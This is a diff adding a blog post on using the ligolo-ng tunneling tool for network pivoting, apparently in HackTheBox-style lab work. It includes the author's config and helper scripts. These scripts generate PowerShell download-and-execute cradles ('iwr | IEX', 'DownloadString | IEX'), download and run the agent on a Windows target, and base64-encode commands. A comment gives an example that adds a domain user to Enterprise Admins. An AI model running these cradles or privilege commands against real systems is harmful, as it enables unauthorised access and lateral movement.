@@ -653,6 +653,276 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2025-11-19 00:00:00+00:00">November 19, 2025</time></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              8 min read
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="ligolo-ng-for-route-fu"><a class="toclink" href="../../2025/11/19/ligolo-ng-for-route-fu/">Ligolo-ng for route-fu</a></h2>
+<p>I really like <code>ligolo-ng</code> <a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a>, its kind of a workflow maturity evolution up and over other proxying tools like <code>chisel</code> or in a lot of cases, even an <code>ssh</code> dynamic port forward (socks proxy).  There's something inefficient about <code>proxychains</code>, while cool and all, transparent routing over <code>wireguard</code> just seems so much cleaner.</p>
+<p>For a long time, I had used <code>ligolo-ng</code> through the console.  It's great!  The only downside I found is that if you wanted multiple active agents/interfaces at the same time, you would have to run multiple instances of the console, each tied to an interface.  Maybe I missed something and I was wrong.</p>
+<p>I'll go over how typically it would be used in console mode, but what I've become a big fan of is the <code>conf</code> file deployment method, and using the web interface for managing agents, interfaces, and listeners.</p>
+<h3 id="console-workflow"><a class="toclink" href="../../2025/11/19/ligolo-ng-for-route-fu/#console-workflow">Console workflow</a></h3>
+<p>You would typically create a new interface, set the interface to "up", and start <code>ligolo-proxy</code>:</p>
+<div class="highlight"><pre><span></span><code>sudo ip tuntap add user $USER mode tun dev ligolo
+sudo ip link set ligolo up
+ligolo-proxy -laddr 10.10.15.101:11601
+</code></pre></div>
+<p>You would then connect <code>ligolo-agent</code> running on a target machine to <code>ligolo-proxy</code> running on attacker</p>
+<div class="highlight"><pre><span></span><code>.\ligolo-agent.exe -connect 10.10.15.101:11601 -retry -ignore
+</code></pre></div>
+<p>You would then activate the session (the agent), do an <code>ifconfig</code> within <code>ligolo-proxy</code> to figure out interfaces on the agent host, and manually add routes to the <code>ligolo</code> interface on attacker:</p>
+<div class="highlight"><pre><span></span><code>sudo ip route add 172.16.55.0/24 dev ligolo
+</code></pre></div>
+<p>this is a gross generalization, the quickstart guide has more advanced usage: <a href="https://docs.ligolo.ng/Quickstart/">https://docs.ligolo.ng/Quickstart/</a></p>
+<h3 id="my-workflow"><a class="toclink" href="../../2025/11/19/ligolo-ng-for-route-fu/#my-workflow">My workflow</a></h3>
+<p>Everyone has their own, I'm sure, but after the above became muscle memory, and I wanted to do more advanced things, like multiple active interfaces, and because working in the console(s) became tedium that wasn't so difficult as it was time inefficient, I gravitated toward a <code>conf</code> file deployment, and the integrated web interface.</p>
+<p>You can read more about doing a <code>conf</code> file deployment here: <a href="https://docs.ligolo.ng/Config-File/">https://docs.ligolo.ng/Config-File/</a></p>
+<p>But my case is a little different, because I have some helper scripts n stuff I built out to streamline the workflow.</p>
+<p>Here's my scrubbed conf</p>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/eighteen<span class="o">]</span>
+└─$<span class="w"> </span>cat<span class="w"> </span>~/ligolo-proxy/ligolo-ng.yaml<span class="w"> </span>
+agent:
+<span class="w">    </span>lab:
+<span class="w">        </span>autobind:<span class="w"> </span><span class="nb">false</span>
+<span class="w">        </span>interface:<span class="w"> </span>ligolo
+interface:
+<span class="w">    </span>ligolo1:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.1/32
+<span class="w">    </span>ligolo2:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.2/32
+<span class="w">    </span>ligolo3:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.3/32
+<span class="w">    </span>ligolo4:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.4/32
+<span class="w">    </span>ligolo5:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.5/32
+<span class="w">    </span>ligolo6:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.6/32
+<span class="w">    </span>ligolo7:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.7/32
+<span class="w">    </span>ligolo8:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.8/32
+<span class="w">    </span>ligolo9:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.9/32
+<span class="w">    </span>ligolo10:
+<span class="w">        </span>routes:
+<span class="w">            </span>-<span class="w"> </span><span class="m">240</span>.0.0.10/32
+web:
+<span class="w">    </span>behindreverseproxy:<span class="w"> </span><span class="nb">false</span>
+<span class="w">    </span>corsallowedorigin:
+<span class="w">        </span>-<span class="w"> </span>https://127.0.0.1:11602
+<span class="w">    </span>debug:<span class="w"> </span><span class="nb">false</span>
+<span class="w">    </span>enabled:<span class="w"> </span><span class="nb">true</span>
+<span class="w">    </span>enableui:<span class="w"> </span><span class="nb">true</span>
+<span class="w">    </span>listen:<span class="w"> </span><span class="m">127</span>.0.0.1:11602
+<span class="w">    </span>logfile:<span class="w"> </span>ui.log
+<span class="w">    </span>secret:<span class="w"> </span><span class="o">[</span>scrubbed<span class="o">]</span>
+<span class="w">    </span>tls:
+<span class="w">        </span>alloweddomains:<span class="w"> </span><span class="o">[]</span>
+<span class="w">        </span>autocert:<span class="w"> </span><span class="nb">false</span>
+<span class="w">        </span>certfile:<span class="w"> </span><span class="s2">""</span>
+<span class="w">        </span>enabled:<span class="w"> </span><span class="nb">true</span>
+<span class="w">        </span>keyfile:<span class="w"> </span><span class="s2">""</span>
+<span class="w">        </span>selfcert:<span class="w"> </span><span class="nb">true</span>
+<span class="w">        </span>selfcertdomain:<span class="w"> </span>web.grimetime.io
+<span class="w">    </span>trustedproxies:
+<span class="w">        </span>-<span class="w"> </span><span class="m">127</span>.0.0.1
+<span class="w">    </span>users:
+<span class="w">        </span>nimda:<span class="w"> </span><span class="o">[</span>scrubbed<span class="o">]</span>
+</code></pre></div>
+<p>My conf will by default create ten different interfaces, each with a default route of <code>240.0.0.x</code> commensurate with the interface number.  You can read more about this special IP range here: <a href="https://docs.ligolo.ng/Localhost/">https://docs.ligolo.ng/Localhost/</a>.  These IPs allow routing to localhost on the agent host.</p>
+<p>For building <code>ligolo-proxy</code> with the integrated webserver, I believe (but haven't tested myself) that you can just do a recursive clone of the repo:</p>
+<div class="highlight"><pre><span></span><code>git clone https://github.com/nicocha30/ligolo-ng.git --recursive
+</code></pre></div>
+<p>The net-effect is the webserver repo <a href="https://github.com/nicocha30/ligolo-ng-web">https://github.com/nicocha30/ligolo-ng-web</a> gets cloned to a subpath within the clone of <a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a>, I am unsure whether building <a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a> also builds <a href="https://github.com/nicocha30/ligolo-ng-web">https://github.com/nicocha30/ligolo-ng-web</a> or if you have to switch to that submodule and build it first.  In my case I had cloned both repos separately and built out the webserver, then copied the relevant files out of it into <a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a>, and built it.</p>
+<p>So, can't provide much help there.</p>
+<p>But basically what I have done is create a directory to be used as a working directory for <code>ligolo-proxy</code>:</p>
+<p><img alt="Pasted_image_20251119020408.png" src="../../../Pasted_image_20251119020408.png"></p>
+<p>The real home of the <code>conf</code> file is in the <code>/etc</code> directory, symlinked into the working directory.</p>
+<p>I have a helper script I wrote for starting <code>ligolo-proxy</code>, allows me to supply just an interface (real) that it will determine IP and CIDR of, and kind of automates starting <code>ligolo-proxy</code>.  It first changes to the working directory (so the conf file gets picked up), does the interface parsing, and starts <code>ligolo-proxy</code>.  I have mine in <code>/var/www/html</code> but don't judge.</p>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[</span><span class="m">2</span><span class="w"> </span>~/ligolo-proxy<span class="o">]</span>
+└─$<span class="w"> </span>cat<span class="w"> </span>~/bin/ligolo-standup.sh<span class="w"> </span>
+<span class="c1">#!/bin/bash</span>
+<span class="nb">cd</span><span class="w"> </span>~/ligolo-proxy
+
+<span class="nv">ipv4s</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>-br<span class="w"> </span>addr<span class="k">)</span>
+<span class="nv">ipv4s</span><span class="o">+=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\n0\t\tUNKNOWN\t\t0.0.0.0/0"</span><span class="k">)</span>
+<span class="nv">eifaces</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">ipv4s</span><span class="p">[@]</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $0}'</span><span class="k">)</span>
+<span class="k">function</span><span class="w"> </span>usage<span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>cat<span class="w"> </span>&lt;&lt;-<span class="s2">"    EOF"</span>
+<span class="w">                </span>USAGE:<span class="w"> </span><span class="nv">$0</span><span class="w"> </span><span class="o">[</span>EXISTING_iface<span class="o">]</span><span class="w"> </span><span class="o">[</span>LIGOLO_iface<span class="o">]</span>
+<span class="w">                </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Existing<span class="w"> </span>interfaces:
+<span class="w">    </span>EOF
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">eifaces</span><span class="p">[@]</span><span class="si">}</span><span class="s2">"</span>
+<span class="w">        </span><span class="nb">exit</span>
+<span class="o">}</span>
+
+<span class="c1">## num args must be 2</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>usage<span class="p">;</span><span class="w"> </span><span class="k">fi</span><span class="w">  </span>
+<span class="c1">## first arg must be existing interface or "0" (0.0.0.0 shorthand)</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>-br<span class="w"> </span>link<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"0"</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>usage<span class="p">;</span><span class="w"> </span><span class="k">fi</span><span class="w">  </span>
+
+<span class="nb">set</span><span class="w"> </span>-x
+<span class="nv">ifcidr</span><span class="o">=</span><span class="k">$(</span>awk<span class="w"> </span><span class="s2">"/^</span><span class="nv">$1</span><span class="s2">.*/{print \$3}"</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="si">${</span><span class="nv">ipv4s</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
+<span class="nv">ifip</span><span class="o">=</span><span class="si">${</span><span class="nv">ifcidr</span><span class="p">%%/*</span><span class="si">}</span>
+<span class="c1"># sudo ip tuntap add user $USER mode tun dev $2</span>
+<span class="c1"># sudo ip link set $2 up</span>
+~/bin/ligma.sh<span class="w"> </span><span class="nv">$1</span>
+sudo<span class="w"> </span>/var/www/html/ligolo-proxy64.elf<span class="w"> </span>-laddr<span class="w"> </span><span class="nv">$ifip</span>:11601<span class="w"> </span>-selfcert<span class="w"> </span>-selfcert-domain<span class="w"> </span>grimetime.io
+<span class="c1"># sudo ip link set $2 down</span>
+<span class="c1"># sudo ip tuntap delete mode tun dev $2</span>
+</code></pre></div>
+<p>There's an auxiliary script, <code>ligma.sh</code>, which mocks up some of the <code>ligolo-agent</code> commands, download cradles, just provides some preliminary output when starting up <code>ligolo-proxy</code>:</p>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[</span><span class="m">2</span><span class="w"> </span>~/ligolo-proxy<span class="o">]</span>
+└─$<span class="w"> </span>cat<span class="w"> </span>~/bin/ligma.sh<span class="w"> </span>
+<span class="c1">#!/bin/bash</span>
+<span class="nv">ipv4s</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>-br<span class="w"> </span>addr<span class="k">)</span>
+<span class="nv">ipv4s</span><span class="o">+=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\n0\t\tUNKNOWN\t\t0.0.0.0/0"</span><span class="k">)</span>
+<span class="nv">eifaces</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">ipv4s</span><span class="p">[@]</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $0}'</span><span class="k">)</span>
+<span class="k">function</span><span class="w"> </span>usage<span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>cat<span class="w"> </span>&lt;&lt;-<span class="s2">"    EOF"</span>
+<span class="w">        </span>USAGE:<span class="w"> </span><span class="nv">$0</span><span class="w"> </span><span class="o">[</span>EXISTING_iface<span class="o">]</span><span class="w"> </span><span class="o">[</span>LIGOLO_iface<span class="o">]</span>
+<span class="w">        </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Existing<span class="w"> </span>interfaces:
+<span class="w">    </span>EOF
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">eifaces</span><span class="p">[@]</span><span class="si">}</span><span class="s2">"</span>
+<span class="w">    </span><span class="nb">exit</span>
+<span class="o">}</span>
+
+<span class="c1">## num args must be 2</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>usage<span class="p">;</span><span class="w"> </span><span class="k">fi</span><span class="w">  </span>
+<span class="c1">## first arg must be existing interface or "0" (0.0.0.0 shorthand)</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>-br<span class="w"> </span>link<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $1}'</span><span class="k">)</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>!<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"0"</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>usage<span class="p">;</span><span class="w"> </span><span class="k">fi</span><span class="w">  </span>
+<span class="nv">fingerprint</span><span class="o">=</span><span class="k">$(</span>sudo<span class="w"> </span>openssl<span class="w"> </span>x509<span class="w"> </span>-in<span class="w"> </span>~/ligolo-proxy/ligolo-selfcerts/grimetime.io_cert<span class="w"> </span>-nocert<span class="w"> </span>-fingerprint<span class="w"> </span>-sha256<span class="p">|</span>sed<span class="w"> </span>-re<span class="w"> </span><span class="s1">'s/.*=//g'</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">'s/://g'</span><span class="k">)</span>
+
+<span class="nv">ifcidr</span><span class="o">=</span><span class="k">$(</span>awk<span class="w"> </span><span class="s2">"/^</span><span class="nv">$1</span><span class="s2">.*/{print \$3}"</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="si">${</span><span class="nv">ipv4s</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
+<span class="nv">ifip</span><span class="o">=</span><span class="si">${</span><span class="nv">ifcidr</span><span class="p">%%/*</span><span class="si">}</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"iwr -uri http://</span><span class="nv">$ifip</span><span class="s2">/ligma.ps1 | IEX ; ligma -ip </span><span class="nv">$ifip</span><span class="s2"> -finger </span><span class="nv">$fingerprint</span><span class="s2">"</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"iwr -uri http://</span><span class="nv">$ifip</span><span class="s2">/ligma.ps1 | IEX ; ligma -ip </span><span class="nv">$ifip</span><span class="s2"> -finger </span><span class="nv">$fingerprint</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ps1_encoded_command.py
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"((New-Object System.Net.WebClient).DownloadString('http://</span><span class="nv">$ifip</span><span class="s2">/ligma.ps1') | IEX ); ligma -ip </span><span class="nv">$ifip</span><span class="s2"> -finger </span><span class="nv">$fingerprint</span><span class="s2">"</span>
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"((New-Object System.Net.WebClient).DownloadString('http://</span><span class="nv">$ifip</span><span class="s2">/ligma.ps1') | IEX ); ligma -ip </span><span class="nv">$ifip</span><span class="s2"> -finger </span><span class="nv">$fingerprint</span><span class="s2">"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ps1_encoded_command.py
+<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\#\# or as sliver alias:\nligolo-agent -- -connect </span><span class="nv">$ifip</span><span class="s2">:11601 -retry -accept-fingerprint </span><span class="nv">$fingerprint</span><span class="s2">"</span>
+</code></pre></div>
+<p>Also a helper for download exec <code>ligolo-agent</code> on a windows host, in the form of a powershell script:</p>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[</span><span class="m">2</span><span class="w"> </span>~/ligolo-proxy<span class="o">]</span>
+└─$<span class="w"> </span>cat<span class="w"> </span>~/bin/ligma.ps1
+<span class="k">function</span><span class="w"> </span>Ligma<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>param<span class="w"> </span><span class="o">(</span><span class="nv">$ip</span>,<span class="nv">$dlport</span><span class="o">=</span><span class="s2">"80"</span>,<span class="nv">$finger</span>,<span class="o">[</span>switch<span class="o">]</span><span class="nv">$ignore</span><span class="o">)</span>
+<span class="w">    </span><span class="nv">$wc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>
+<span class="w">    </span><span class="nv">$cwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>Get-Location<span class="o">)</span>.Path
+<span class="w">    </span><span class="nv">$agent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"ligolo-agent64.exe"</span>
+<span class="w">    </span><span class="nv">$binpath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$cwd</span><span class="s2">\$agent"</span>
+<span class="w">    </span><span class="nv">$ruri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://</span><span class="nv">$ip</span><span class="s2">"</span>+<span class="s2">":"</span>+<span class="s2">"</span><span class="nv">$dlport</span><span class="s2">/</span><span class="nv">$agent</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>-not<span class="w"> </span><span class="o">((</span><span class="nv">$PSBoundParameters</span>.ContainsKey<span class="o">(</span><span class="s1">'ip'</span><span class="o">)))){</span>
+<span class="w">        </span>Write-Host<span class="w"> </span><span class="s2">"Bare minimum, need to supply an -ip and either -finger [fp] or -ignore"</span>
+<span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>-not<span class="w"> </span><span class="o">(</span>Test-Path<span class="w"> </span><span class="s2">"</span><span class="nv">$binpath</span><span class="s2">"</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                        </span><span class="nv">$wc</span>.DownloadFile<span class="o">(</span><span class="s2">"</span><span class="nv">$ruri</span><span class="s2">"</span>,<span class="s2">"</span><span class="nv">$binpath</span><span class="s2">"</span><span class="o">)</span>
+<span class="w">            </span><span class="o">}</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$ignore</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                        </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">"</span><span class="nv">$binpath</span><span class="s2">"</span><span class="w"> </span>-connect<span class="w"> </span><span class="nv">$ip</span><span class="sb">`</span>:11601<span class="w"> </span>-retry<span class="w"> </span>-ignore-cert
+<span class="w">                </span><span class="o">}</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$PSBoundParameters</span>.ContainsKey<span class="o">(</span><span class="s1">'finger'</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
+<span class="w">                        </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">"</span><span class="nv">$binpath</span><span class="s2">"</span><span class="w"> </span>-connect<span class="w"> </span><span class="nv">$ip</span><span class="sb">`</span>:11601<span class="w"> </span>-retry<span class="w"> </span>-accept-fingerprint<span class="w"> </span><span class="nv">$finger</span>
+<span class="w">            </span><span class="o">}</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+<p>And a helper for powershell encoded command generation, which is used in part by that output, but I also use it in other places:</p>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[</span><span class="m">2</span><span class="w"> </span>~/ligolo-proxy<span class="o">]</span>
+└─$<span class="w"> </span>cat<span class="w"> </span>~/bin/ps1_encoded_command.py<span class="w"> </span>
+<span class="c1">#!/usr/bin/env python3</span>
+import<span class="w"> </span>base64,<span class="w"> </span>sys
+<span class="k">if</span><span class="w"> </span>not<span class="w"> </span>len<span class="o">(</span>sys.argv<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>:
+<span class="w">        </span><span class="nv">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sys.stdin.read<span class="o">()</span>
+<span class="k">else</span>:
+<span class="w">        </span><span class="nv">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sys.argv<span class="o">[</span><span class="m">1</span><span class="o">]</span>
+<span class="c1">## Functionally equivalent to:</span>
+<span class="c1">#, pwsh</span>
+<span class="c1">#, $text = "net.exe user duff likebeer123! /add /domain; net.exe group `"Enterprise Admins`" duff /add /domain"</span>
+<span class="c1">#, [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text)) </span>
+import<span class="w"> </span>base64<span class="p">;</span><span class="w"> </span>print<span class="o">(</span>base64.b64encode<span class="o">(</span>stream.rstrip<span class="o">(</span><span class="s2">"\n"</span><span class="o">)</span>.encode<span class="o">(</span><span class="s2">"utf-16-le"</span><span class="o">))</span>.decode<span class="o">())</span>
+</code></pre></div>
+<p>Probably one other sofar unspoken detail is generating self-signed certificate, which we should definitely want an encrypted transport.</p>
+<div class="highlight"><pre><span></span><code><span class="nv">ss_cname</span><span class="o">=</span><span class="s2">"grimetime.io"</span>
+<span class="nv">ss_org</span><span class="o">=</span><span class="s2">"Grime Time Syndicated"</span>
+<span class="nv">ss_ipaddr</span><span class="o">=</span><span class="s2">"192.168.45.189"</span>
+<span class="nv">ss_keyname</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">ss_cname</span><span class="si">}</span><span class="s2">.key"</span><span class="p">;</span><span class="nv">ss_certname</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">ss_cname</span><span class="si">}</span><span class="s2">.crt"</span><span class="p">;</span><span class="nv">ss_pemname</span><span class="o">=</span><span class="s2">"</span><span class="si">${</span><span class="nv">ss_cname</span><span class="si">}</span><span class="s2">.pem"</span><span class="p">;</span>openssl<span class="w"> </span>req<span class="w"> </span>-nodes<span class="w"> </span>-x509<span class="w"> </span>-sha256<span class="w"> </span>-newkey<span class="w"> </span>rsa:4096<span class="w"> </span>-keyout<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">ss_keyname</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span>-out<span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">ss_certname</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span>-days<span class="w"> </span><span class="m">365</span><span class="w"> </span>-subj<span class="w"> </span><span class="s2">"/C=US/ST=NE/L=Monowi/O=</span><span class="si">${</span><span class="nv">ss_org</span><span class="si">}</span><span class="s2">/OU=Research and Development/CN=</span><span class="si">${</span><span class="nv">ss_cname</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span>-addext<span class="w"> </span><span class="s2">"subjectAltName = DNS:localhost,DNS:grimetime.io,IP:</span><span class="si">${</span><span class="nv">ss_ipaddr</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>cat<span class="w"> </span><span class="nv">$ss_keyname</span><span class="w"> </span><span class="nv">$ss_certname</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$ss_pemname</span>
+</code></pre></div>
+<h3 id="my-workflow-get-grimey-connected"><a class="toclink" href="../../2025/11/19/ligolo-ng-for-route-fu/#my-workflow-get-grimey-connected">My workflow:  Get grimey connected</a></h3>
+<p>Maybe obscene, maybe slightly unnecessary, and definitely takes the tedium out of standing up <code>ligolo-proxy</code>:</p>
+<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[</span><span class="m">2</span><span class="w"> </span>~<span class="o">]</span>
+└─$<span class="w"> </span>ligolo-standup.sh<span class="w"> </span>tun0
+++<span class="w"> </span>awk<span class="w"> </span><span class="s1">'/^tun0.*/{print $3}'</span>
++<span class="w"> </span><span class="nv">ifcidr</span><span class="o">=</span><span class="m">172</span>.16.1.3/23
++<span class="w"> </span><span class="nv">ifip</span><span class="o">=</span><span class="m">172</span>.16.1.3
++<span class="w"> </span>/home/notroot/bin/ligma.sh<span class="w"> </span>tun0
+<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>notroot:<span class="w"> </span>
+iwr<span class="w"> </span>-uri<span class="w"> </span>http://172.16.1.3/ligma.ps1<span class="w"> </span><span class="p">|</span><span class="w"> </span>IEX<span class="w"> </span><span class="p">;</span><span class="w"> </span>ligma<span class="w"> </span>-ip<span class="w"> </span><span class="m">172</span>.16.1.3<span class="w"> </span>-finger<span class="w"> </span>8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
+aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEALgAzAC8AbABpAGcAbQBhAC4AcABzADEAIAB8ACAASQBFAFgAIAA7ACAAbABpAGcAbQBhACAALQBpAHAAIAAxADcAMgAuADEANgAuADEALgAzACAALQBmAGkAbgBnAGUAcgAgADgARABBAEEAMwAwAEQAQgA0ADcAOQBBADAAQQBBADkANQAxADIANAA0ADAAQQAyADkAOQAwADIAMABCADcAMAAwAEYARQBEAEUARAAyAEIANwAxADYAOQBFADcAMgAzADkAMgAyAEEAOAA3ADQARgBFAEMAMAA2AEIAMAAxAEIA
+<span class="o">((</span>New-Object<span class="w"> </span>System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://172.16.1.3/ligma.ps1'</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>IEX<span class="w"> </span><span class="o">)</span><span class="p">;</span><span class="w"> </span>ligma<span class="w"> </span>-ip<span class="w"> </span><span class="m">172</span>.16.1.3<span class="w"> </span>-finger<span class="w"> </span>8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
